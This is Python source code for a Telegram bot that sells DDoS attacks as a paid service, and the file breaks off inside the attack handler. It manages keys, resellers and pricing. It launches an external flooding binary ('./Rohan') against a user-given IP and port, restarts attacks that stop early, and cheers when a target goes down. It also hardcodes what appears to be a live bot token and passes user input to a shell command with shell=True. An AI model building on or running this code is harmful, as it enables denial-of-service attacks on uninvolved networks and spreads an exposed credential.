# Required packages: pip install pyTelegramBotAPI psutil python-dateutil pytz

import os
import json
import time
import telebot
import datetime
import subprocess
import threading
import signal
from dateutil.relativedelta import relativedelta
import pytz
import psutil
import platform
import re
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
bot = telebot.TeleBot('7520138270:AAFAdGncvbChu5zwtWqnP1CYd_IAAkHZzMM')  # Replace with your bot token

# Admin user IDs
admin_id = {"1807014348", "6258297180", "6955279265"}  # Replace with your admin Telegram ID

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
BLOCK_ERROR_LOG = "block_error_log.txt"

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}
keys = {}
authorized_users = {}
last_attack_time = {}
running_attacks = {}
COOLDOWN_PERIOD = 60
DEFAULT_PACKET_SIZE = 1200
MAX_ATTACK_DURATION = 86400  # 24 hours in seconds

# Emoji list for reactions
EMOJI_LIST = ["👍", "❤", "🔥", "🥰", "👏", "😁", "🤔", "🤯", "😱", "🎉", "🤩", "🙏", "👌", "😍", "❤‍🔥", "🌚", "💯", "🤣", "💔", "😐", "🇮🇳", "😈", "😴", "😭", "🤓", "😇", "🤝", "🤗", "🫡", "🤪", "🗿", "🆒", "💘", "😘", "😎", "🇳🇵"]

def escape_markdown_v2(text):
    """Escape all special characters for Telegram MarkdownV2, preserving emojis."""
    if not isinstance(text, str):
        text = str(text)
    # Telegram MarkdownV2 reserved characters, including hyphen
    special_chars = r'([_*[\]()~`>#+\-=\|{}.!])'
    return re.sub(special_chars, r'\\\1', text)

def get_android_version():
    """Get the Android version if running on Termux."""
    try:
        if "Android" in platform.system():
            version = os.popen("getprop ro.build.version.release").read().strip()
            return version if version else "Unknown"
        return "Not Android"
    except:
        return "Unknown"

def check_system_resources(chat_id, during_attack=False):
    """Check CPU and memory, either before or during an attack."""
    cpu_usage = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    memory_usage = memory.percent
    android_version = get_android_version()
    if android_version == "Unknown" or android_version == "Not Android":
        cpu_limit = 90
        memory_limit = 90
    else:
        try:
            version_num = float(android_version)
            if 7.0 <= version_num <= 9.0:
                cpu_limit = 70
                memory_limit = 70
            else:
                cpu_limit = 80
                memory_limit = 80
        except ValueError:
            cpu_limit = 80
            memory_limit = 80
    if cpu_usage > cpu_limit:
        message = f"[\\\-=x\\\-=] *SYSTEM OVERLOAD DETECTED* [\\\-=x\\\-=]\n>>> *CPU USAGE CRITICAL*: {escape_markdown_v2(cpu_usage)}% \\(LIMIT: {escape_markdown_v2(cpu_limit)}%\\) ⚡\n>>> *{escape_markdown_v2('ATTACK MAY TERMINATE' if during_attack else 'CANNOT DEPLOY ATTACK')}* 🚨\n[\\\-=x\\\-=] *UPGRADE HARDWARE\\, BHAI\\! CONTACT @Rahul_618* [\\\-=x\\\-=] 💾😎"
        bot.send_message(chat_id, message, parse_mode='MarkdownV2')
        return False
    if memory_usage > memory_limit:
        message = f"[\\\-=x\\\-=] *SYSTEM OVERLOAD DETECTED* [\\\-=x\\\-=]\n>>> *MEMORY USAGE CRITICAL*: {escape_markdown_v2(memory_usage)}% \\(LIMIT: {escape_markdown_v2(memory_limit)}%\\) ⚡\n>>> *{escape_markdown_v2('ATTACK MAY TERMINATE' if during_attack else 'CANNOT DEPLOY ATTACK')}* 🚨\n[\\\-=x\\\-=] *UPGRADE HARDWARE\\, BHAI\\! CONTACT @Rahul_618* [\\\-=x\\\-=] 💾😎"
        bot.send_message(chat_id, message, parse_mode='MarkdownV2')
        return False
    return True

def monitor_attack(attack_id, chat_id, duration):
    """Monitor the attack to ensure it runs for the full duration and doesn't stop early."""
    start_time = datetime.datetime.now(IST)
    end_time = start_time + datetime.timedelta(seconds=duration)
    while datetime.datetime.now(IST) < end_time:
        if attack_id not in running_attacks:
            message = f"[\\\-=x\\\-=] *CRITICAL ERROR DETECTED* [\\\-=x\\\-=]\n>>> *ATTACK {escape_markdown_v2(attack_id)} TERMINATED PREMATURELY* 🚨\n>>> *REBOOTING ATTACK PROTOCOL\\.\\.\\.* 🔄\n[\\\-=x\\\-=] *ISSUE\\? CONTACT @Rahul_618\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.send_message(chat_id, message, parse_mode='MarkdownV2')
            with open("attack_debug.log", "a") as debug_file:
                debug_file.write(f"[{datetime.datetime.now(IST)}] Attack {attack_id} stopped early, restarting...\n")
            attack_info = running_attacks.get(attack_id, {})
            if attack_info:
                remaining_time = int((end_time - datetime.datetime.now(IST)).total_seconds())
                if remaining_time > 0:
                    target = attack_info["target"]
                    port = attack_info["port"]
                    username = attack_info["username"]
                    user_id = attack_info.get("user_id", chat_id)
                    execute_attack(target, port, remaining_time, chat_id, username, last_attack_time, user_id)
        if not check_system_resources(chat_id, during_attack=True):
            message = f"[\\\-=x\\\-=] *WARNING: SYSTEM RESOURCES LOW* [\\\-=x\\\-=]\n>>> *ATTACK {escape_markdown_v2(attack_id)} MAY FAIL* ⚠️\n[\\\-=x\\\-=] *GET SUPPORT FROM @Rahul_618\\, BHAI\\!* [\\\-=x\\\-=] 💾😇"
            bot.send_message(chat_id, message, parse_mode='MarkdownV2')
        time.sleep(30)

def set_cooldown(seconds):
    """Set the global cooldown period."""
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    try:
        with open("cooldown.json", "w") as file:
            json.dump({"cooldown": seconds}, file)
    except Exception as e:
        print(f"Error saving cooldown: {str(e)}")

def load_cooldown():
    """Load the cooldown period from file."""
    global COOLDOWN_PERIOD
    try:
        with open("cooldown.json", "r") as file:
            data = json.load(file)
            COOLDOWN_PERIOD = data.get("cooldown", 60)
    except FileNotFoundError:
        COOLDOWN_PERIOD = 60
    except Exception as e:
        print(f"Error loading cooldown: {str(e)}")
        COOLDOWN_PERIOD = 60

def load_data():
    global users, keys, authorized_users
    try:
        users = read_users()
        keys = read_keys()
        authorized_users = read_authorized_users()
        load_cooldown()
        print(f"Data loaded successfully. Keys: {list(keys.keys())}")
    except Exception as e:
        print(f"Error loading data: {str(e)}")
        keys = {}
        users = {}
        authorized_users = {}

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error reading users: {str(e)}")
        return {}

def save_users():
    try:
        with open(USER_FILE, "w") as file:
            json.dump(users, file)
    except Exception as e:
        print(f"Error saving users: {str(e)}")

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            data = json.load(file)
            for key, value in data.items():
                if "generated_time" not in value:
                    value["generated_time"] = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
                    value["generated_by"] = "Unknown"
            return data if isinstance(data, dict) else {}
    except FileNotFoundError:
        print(f"{KEY_FILE} not found, initializing empty keys.")
        return {}
    except json.JSONDecodeError:
        print(f"Error decoding {KEY_FILE}, initializing empty keys.")
        return {}
    except Exception as e:
        print(f"Error reading keys: {str(e)}")
        return {}

def save_keys():
    try:
        with open(KEY_FILE, "w") as file:
            json.dump(keys, file, indent=4)
        print(f"Keys saved successfully: {list(keys.keys())}")
    except Exception as e:
        print(f"Error saving keys: {str(e)}")

def read_authorized_users():
    try:
        with open(AUTHORIZED_USERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error reading authorized users: {str(e)}")
        return {}

def save_authorized_users():
    try:
        with open(AUTHORIZED_USERS_FILE, "w") as file:
            json.dump(authorized_users, file)
    except Exception as e:
        print(f"Error saving authorized users: {str(e)}")

def parse_duration(duration_str):
    """Parse duration string (e.g., 1min, 1h, 1d, 1m, 1hours, 1days, 1months) and return minutes, hours, days, months."""
    duration_str = duration_str.lower()
    duration_str = duration_str.replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return None, None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if value < 1 or value > 59:
            return None, None, None, None
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}
    except Exception as e:
        print(f"Error loading resellers: {str(e)}")
        return {}

def save_resellers(resellers):
    try:
        with open(RESELLERS_FILE, "w") as file:
            json.dump(resellers, file, indent=4)
    except Exception as e:
        print(f"Error saving resellers: {str(e)}")

resellers = load_resellers()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    try:
        with open("log.txt", "a") as file:
            file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
    except Exception as e:
        print(f"Error logging command: {str(e)}")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    try:
        with open("log.txt", "a") as file:
            log_entry += "\n"
            file.write(log_entry)
    except Exception as e:
        print(f"Error recording command logs: {str(e)}")

def create_main_menu():
    """Create the main menu with inline buttons."""
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        InlineKeyboardButton("🔥 ATTACK", callback_data="menu_attack"),
        InlineKeyboardButton("🔑 REDEEM KEY", callback_data="menu_redeem"),
        InlineKeyboardButton("📜 HELP", callback_data="menu_help"),
        InlineKeyboardButton("💰 BALANCE", callback_data="menu_balance"),
        InlineKeyboardButton("👤 MY INFO", callback_data="menu_myinfo"),
        InlineKeyboardButton("📋 LIST KEYS", callback_data="menu_listkeys")
    )
    return markup

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    try:
        if not check_system_resources(chat_id):
            with open("attack_debug.log", "a") as debug_file:
                debug_file.write(f"[{datetime.datetime.now(IST)}] System resource check failed for {user_id}\n")
            return
        packet_size = DEFAULT_PACKET_SIZE
        if packet_size < 1 or packet_size > 65507:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID PACKET SIZE*: `{escape_markdown_v2(packet_size)}` 📦\n>>> *MUST BE BETWEEN 1 AND 65507*\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.send_message(chat_id, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            with open("attack_debug.log", "a") as debug_file:
                debug_file.write(f"[{datetime.datetime.now(IST)}] Invalid packet size {packet_size} for {user_id}\n")
            return
        if not os.path.isfile("./Rohan") or not os.access("./Rohan", os.X_OK):
            message = f"[\\\-=x\\\-=] *CRITICAL ERROR DETECTED* [\\\-=x\\\-=]\n>>> *ROHAN EXECUTABLE NOT FOUND OR NOT EXECUTABLE* 🚨\n>>> *COMPILE Rohan\\.c AND PLACE IT IN THE SAME DIRECTORY*\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.send_message(chat_id, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            with open("attack_debug.log", "a") as debug_file:
                debug_file.write(f"[{datetime.datetime.now(IST)}] Rohan executable missing for {user_id}\n")
            return
        attack_id = f"{user_id}_{int(time.time())}"
        full_command = f"./Rohan {target} {port} {time} {packet_size}"
        start_time = datetime.datetime.now(IST)
        start_time_str = start_time.strftime('%Y-%m-%d %I:%M:%S %p')
        message = f"[\\\-=x\\\-=] *SYSTEM BREACH DETECTED* [\\\-=x\\\-=]\n[*] *ATTACK DEPLOYED\\, BHAI\\!* 🔥💥\n>>> *ATTACK ID*: `{escape_markdown_v2(attack_id)}` 🆔\n>>> *TARGET LOCKED*: `{escape_markdown_v2(target)}:{escape_markdown_v2(port)}` 🌐\n>>> *DURATION*: `{escape_markdown_v2(time)}` SECONDS ⏱️\n>>> *PACKET SIZE*: `{escape_markdown_v2(packet_size)}` BYTES 📦\n>>> *THREADS*: `512` 🛠️\n>>> *ATTACKER*: @{escape_markdown_v2(username)} 💻😎\n>>> *STARTED*: `{escape_markdown_v2(start_time_str)}` 🕒\n[\\\-=x\\\-=] *PACKETS UNLEASHED\\! TARGET KO BAJA DAALO\\!* [\\\-=x\\\-=] ⚡💯"
        bot.send_message(chat_id, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        running_attacks[attack_id] = {
            "target": target,
            "port": port,
            "time": time,
            "start_time": start_time,
            "chat_id": chat_id,
            "username": username,
            "process": process,
            "pid": process.pid,
            "user_id": user_id
        }
        last_attack_time[user_id] = start_time
        threading.Thread(target=monitor_attack, args=(attack_id, chat_id, time)).start()
        stop_thread = threading.Thread(target=precise_stop, args=(attack_id, chat_id, time))
        stop_thread.start()
        with open("attack_debug.log", "a") as debug_file:
            debug_file.write(f"[{datetime.datetime.now(IST)}] Attack started: {attack_id} by {user_id}\n")
    except Exception as e:
        message = f"[\\\-=x\\\-=] *FATAL ERROR DETECTED* [\\\-=x\\\-=]\n>>> *ERROR EXECUTING ATTACK*: `{escape_markdown_v2(str(e))}` 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.send_message(chat_id, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        with open("attack_debug.log", "a") as debug_file:
            debug_file.write(f"[{datetime.datetime.now(IST)}] Attack failed for {user_id}: {str(e)}\n")
        if attack_id in running_attacks:
            del running_attacks[attack_id]

def precise_stop(attack_id, chat_id, duration):
    """Stop the attack exactly after the specified duration with no delay."""
    start_time = running_attacks[attack_id]["start_time"]
    end_time = start_time + datetime.timedelta(seconds=duration)
    while datetime.datetime.now(IST) < end_time:
        remaining = (end_time - datetime.datetime.now(IST)).total_seconds()
        if remaining > 0:
            time.sleep(min(remaining, 0.1))  # Sleep in small increments to avoid drift
    stop_attack_instantly(attack_id, chat_id)

def stop_attack_instantly(attack_id, chat_id):
    if attack_id in running_attacks:
        attack_info = running_attacks[attack_id]
        process = attack_info["process"]
        try:
            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
            stdout, stderr = process.communicate()
            end_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
            message = f"[\\\-=x\\\-=] *ATTACK TERMINATED* [\\\-=x\\\-=]\n[*] *MISSION COMPLETE\\, BHAI\\!* ✅🎉\n>>> *ATTACK ID*: `{escape_markdown_v2(attack_id)}` 🆔\n>>> *TARGET*: `{escape_markdown_v2(attack_info['target'])}:{escape_markdown_v2(attack_info['port'])}` 🌐\n>>> *ENDED*: `{escape_markdown_v2(end_time)}` 🕒\n[\\\-=x\\\-=] *SYSTEM SHUTDOWN\\! TARGET DOWN\\!* [\\\-=x\\\-=] 🔴💥"
            bot.send_message(chat_id, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            with open("rohan_output.log", "a") as log_file:
                log_file.write(f"[{datetime.datetime.now(IST)}] Attack ID: {attack_id}\n")
                log_file.write(f"Target: {attack_info['target']}:{attack_info['port']}\n")
                log_file.write(f"Ended at: {end_time}\n")
                log_file.write(f"STDOUT:\n{stdout}\n")
                log_file.write(f"STDERR:\n{stderr}\n")
            if process.returncode != 0:
                error_message = f"[\\\-=x\\\-=] *ATTACK FAILURE DETECTED* [\\\-=x\\\-=]\n>>> *ERROR*: CHECK LOGS FOR DETAILS 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                bot.send_message(chat_id, error_message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
                for admin in admin_id:
                    admin_message = f"[\\\-=x\\\-=] *ATTACK FAILURE REPORT* [\\\-=x\\\-=]\n>>> *ATTACK ID*: `{escape_markdown_v2(attack_id)}` 🆔\n>>> *ERROR*: `{escape_markdown_v2(stderr)}` 🚨\n[\\\-=x\\\-=] *CHECK LOGS\\, ADMIN BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                    bot.send_message(admin, admin_message, parse_mode='MarkdownV2')
        except Exception as e:
            message = f"[\\\-=x\\\-=] *ERROR STOPPING ATTACK* [\\\-=x\\\-=]\n>>> *ATTACK ID*: `{escape_markdown_v2(attack_id)}` 🆔\n>>> *ERROR*: `{escape_markdown_v2(str(e))}` 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.send_message(chat_id, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        finally:
            if attack_id in running_attacks:
                del running_attacks[attack_id]

@bot.message_handler(commands=['start'])
def start_command(message):
    if message.chat.type != "private":
        message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message_text, parse_mode='MarkdownV2')
        return
    user_id = str(message.from_user.id)
    has_active_access = False
    if user_id in admin_id or user_id in users or user_id in authorized_users:
        if user_id in users:
            try:
                expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                if datetime.datetime.now(IST) < expiration_date:
                    has_active_access = True
            except ValueError:
                has_active_access = False
        elif user_id in authorized_users:
            try:
                expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                if datetime.datetime.now(IST) < expiration_date:
                    has_active_access = True
            except ValueError:
                has_active_access = False
        else:
            has_active_access = True
    message_text = f"[\\\-=x\\\-=] *CYBER COMMAND CENTER* [\\\-=x\\\-=]\n[*] *WELCOME TO SADIQ BOT\\, BHAI\\!* 🌟😎\n>>> *STATUS*: {escape_markdown_v2('ELITE ACCESS GRANTED' if has_active_access else 'ACCESS PENDING')} 🟢\n>>> *POWERED BY*: @Rahul_618 💻\n[\\\-=x\\\-=] *CHOOSE YOUR COMMAND BELOW\\!* [\\\-=x\\\-=] ⚡💥"
    bot.reply_to(message, message_text, parse_mode='MarkdownV2', reply_markup=create_main_menu())

@bot.message_handler(commands=['help'])
def help_command(message):
    if message.chat.type != "private":
        message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message_text, parse_mode='MarkdownV2')
        return
    user_id = str(message.from_user.id)
    help_text = f"[\\\-=x\\\-=] *HACKER COMMAND GUIDE* [\\\-=x\\\-=]\n[*] *VIP DDOS PROTOCOLS* 📜🔥\n\n*BOT CONTROLS:*\n>>> `/start` \\- BOOT UP THE BOT 🌟\n>>> `/help` \\- SHOW THIS GUIDE 📋\n\n*POWER MANAGEMENT:*\n>>> `/attack <ip> <port> <time>` \\- LAUNCH ATTACK \\(ADMIN/AUTH ONLY\\) ⚡\n>>> `/attacks` \\- LIST RUNNING ATTACKS \\(ADMIN ONLY\\) 🛠️\n>>> `/setcooldown <seconds>` \\- SET COOLDOWN \\(ADMIN ONLY\\) ⏳\n>>> `/checkcooldown` \\- CHECK COOLDOWN STATUS ⏱️\n>>> `/addreseller <user_id> <balance>` \\- ADD RESELLER \\(ADMIN ONLY\\) 💰\n>>> `/genkey <duration> <key_name>` \\- GENERATE KEY \\(ADMIN/RESELLER\\) 🔑\n>>> `/logs` \\- VIEW RECENT LOGS \\(ADMIN ONLY\\) 📜\n>>> `/users` \\- LIST AUTH USERS \\(ADMIN ONLY\\) 👥\n>>> `/add <user_id>` \\- ADD USER ID \\(ADMIN ONLY\\) ➕\n>>> `/remove <user_id>` \\- REMOVE USER \\(ADMIN ONLY\\) ➖\n>>> `/resellers` \\- VIEW RESELLERS 💸\n>>> `/addbalance <reseller_id> <amount>` \\- ADD BALANCE \\(ADMIN ONLY\\) 💰\n>>> `/removereseller <reseller_id>` \\- REMOVE RESELLER \\(ADMIN ONLY\\) 🚫\n>>> `/block <key_name>` \\- BLOCK A KEY \\(ADMIN ONLY\\) 🔒\n>>> `/redeem <key_name>` \\- REDEEM YOUR KEY 🔓\n>>> `/balance` \\- CHECK RESELLER BALANCE 💵\n>>> `/myinfo` \\- VIEW YOUR INFO 👤\n>>> `/listkeys` \\- LIST ALL KEYS \\(ADMIN ONLY\\) 📋\n\n*EXAMPLES:*\n>>> `/genkey 1d rahul` \\- 1\\-DAY KEY \\(KEY: Rahul_sadiq\\-rahul\\) 🔑\n>>> `/attack 192\\.168\\.1\\.1 80 120` \\- LAUNCH ATTACK ⚡\n>>> `/redeem Rahul_sadiq\\-rahul` \\- REDEEM KEY 🔓\n\n[\\\-=x\\\-=] *BUY KEY FROM @Rahul_618\\, BHAI\\!* [\\\-=x\\\-=] 💸😎"
    bot.reply_to(message, help_text, parse_mode='MarkdownV2', reply_markup=create_main_menu())

@bot.message_handler(commands=['balance'])
def check_balance(message):
    if message.chat.type != "private":
        message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message_text, parse_mode='MarkdownV2')
        return
    user_id = str(message.from_user.id)
    if user_id in resellers:
        current_balance = resellers[user_id]
        message = f"[\\\-=x\\\-=] *WALLET STATUS* [\\\-=x\\\-=]\n[*] *YOUR BALANCE\\, BHAI\\!* 💰✨\n>>> *CURRENT BALANCE*: `{escape_markdown_v2(current_balance)}` Rs 🤑\n[\\\-=x\\\-=] *KEEP HACKING\\!* [\\\-=x\\\-=] 💸😎"
    else:
        message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *RESELLER ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
    bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    if message.chat.type != "private":
        message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message_text, parse_mode='MarkdownV2')
        return
    user_id = str(message.from_user.id)
    command = message.text.split()
    if len(command) != 2:
        message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/redeem <key_name>` 🔓\n>>> *EXAMPLE*: `/redeem Rahul_sadiq\\-rahul`\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    key = command[1].strip()
    if user_id in admin_id or (user_id in authorized_users and not users.get(user_id)):
        message = f"[\\\-=x\\\-=] *ELITE ACCESS DETECTED* [\\\-=x\\\-=]\n>>> *ADMIN/AUTH USER: NO NEED TO REDEEM A KEY* 🟢\n[\\\-=x\\\-=] *KEEP HACKING\\, BHAI\\!* [\\\-=x\\\-=] 💻😎"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    if user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                message = f"[\\\-=x\\\-=] *ACTIVE KEY DETECTED* [\\\-=x\\\-=]\n>>> *YOU ALREADY HAVE A KEY\\!* 🔑\n>>> *EXPIRES ON*: `{escape_markdown_v2(expiration_date.strftime('%Y-%m-%d %I:%M:%S %p'))}` 🕒\n>>> *WAIT TO REDEEM A NEW ONE OR BUY FROM @Rahul_618 FOR 50₹\\!* 💸\n[\\\-=x\\\-=] *KEEP HACKING\\, BHAI\\!* [\\\-=x\\\-=] 💻😎"
                bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
                return
            else:
                del users[user_id]
                save_users()
        except ValueError:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID EXPIRATION DATE FORMAT* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            return
    if key in keys:
        if keys[key].get("blocked", False):
            message = f"[\\\-=x\\\-=] *KEY BLOCKED* [\\\-=x\\\-=]\n>>> *THIS KEY IS BLOCKED* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            return
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            message = f"[\\\-=x\\\-=] *DEVICE LIMIT REACHED* [\\\-=x\\\-=]\n>>> *KEY HAS REACHED ITS DEVICE LIMIT* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR A NEW KEY\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            return
        if user_id in keys[key]["devices"]:
            message = f"[\\\-=x\\\-=] *KEY ALREADY REDEEMED* [\\\-=x\\\-=]\n>>> *YOU HAVE ALREADY REDEEMED THIS KEY* 🔑\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR A NEW KEY\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            return
        duration = keys[key]["duration"]
        minutes, hours, days, months = parse_duration(duration)
        if minutes is None and hours is None and days is None and months is None:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID DURATION IN KEY* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            return
        expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
        users[user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key]["devices"].append(user_id)
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            del keys[key]
        save_users()
        save_keys()
        message = f"[\\\-=x\\\-=] *KEY REDEMPTION SUCCESS* [\\\-=x\\\-=]\n[*] *ACCESS GRANTED\\, BHAI\\!* ✅🎉\n>>> *EXPIRES ON*: `{escape_markdown_v2(expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'))}` 🕒\n[\\\-=x\\\-=] *LET’S HACK\\, BHAI\\!* [\\\-=x\\\-=] 💻😎"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
    else:
        message = f"[\\\-=x\\\-=] *INVALID KEY* [\\\-=x\\\-=]\n>>> *KEY INVALID OR EXPIRED* 🚫\n>>> *BUY A NEW KEY FOR 50₹ FROM @Rahul_618\\, BHAI\\!* 💸\n[\\\-=x\\\-=] *LET’S GET BACK TO HACKING\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if message.chat.type != "private":
        message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message_text, parse_mode='MarkdownV2')
        return
    user_id = str(message.from_user.id)
    if user_id not in admin_id and user_id not in users and user_id not in authorized_users:
